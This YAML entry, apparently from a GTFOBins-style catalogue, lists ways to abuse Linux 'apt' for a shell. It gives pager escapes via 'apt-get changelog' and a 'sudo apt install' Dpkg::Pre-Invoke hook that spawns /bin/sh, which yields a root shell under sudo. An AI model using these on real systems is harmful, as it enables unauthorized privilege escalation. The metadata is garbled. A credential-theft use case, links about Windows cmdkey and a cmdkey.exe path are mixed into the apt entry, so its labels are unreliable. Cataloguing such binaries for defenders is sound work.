---
name: apt
description: This invokes the default pager, which is likely to be less, other functions may apply.
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        apt-get changelog apt
        !/bin/sh
      mitreid: T1078
      mitrelink: https://attack.mitre.org/wiki/Technique/T1078
      operatingsystem: Linux
      privileges: User
      usecase: Get credential information from host
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo apt-get changelog apt
        !/bin/sh
      mitreid: T1078
      mitrelink: https://attack.mitre.org/wiki/Technique/T1078
      operatingsystem: Linux
      privileges: User
      usecase: Get credential information from host
    - description: For this to work the target package (e.g., `sl`) must not be installed.
      code: sudo apt install -c <(echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}') sl
      mitreid: T1078
      mitrelink: https://attack.mitre.org/wiki/Technique/T1078
      operatingsystem: Linux
      privileges: User
      usecase: Get credential information from host
resources:
    - resource: https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation
    - resource: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey
fullpath:
    - path: /bin/apt
    - path: C:\Windows\SysWOW64\cmdkey.exe
detection:
  - IOC: Usage of this command could be an IOC
acknowledgement:
  - Person: 
    Handle: ''
---
